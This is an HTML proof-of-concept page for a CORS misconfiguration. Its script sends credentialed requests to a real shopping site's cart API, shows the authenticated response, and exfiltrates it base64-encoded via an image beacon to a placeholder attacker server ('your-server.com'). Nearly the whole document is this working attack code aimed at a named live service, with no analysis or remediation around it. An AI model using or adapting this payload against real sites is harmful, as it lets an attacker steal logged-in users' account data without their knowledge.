<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CORS PoC</title>
</head>

<body>

<h2>Loading...</h2>
<pre id="out"></pre>

<script>

function log(label, data){
    document.getElementById("out").innerText += 
        "[DATA] " + label + JSON.stringify(data) + "\n";
}


const endpoints = {
    cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
    count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
};

for (let key in endpoints){

    fetch(endpoints[key], {
        method: "GET",
        credentials: "include",
        headers: {
            "Accept": "application/json, text/plain, */*"
        }
    })
    .then(r => r.json())
    .then(data => {
        log(key, data);

        // exfiltration
        new Image().src =
            "https://your-server.com/log?d=" +
            btoa(key + ":" + JSON.stringify(data));

    })
    .catch(e => {
        log(key, {error: e.toString()});
    });

}

</script>

</body>
</html>
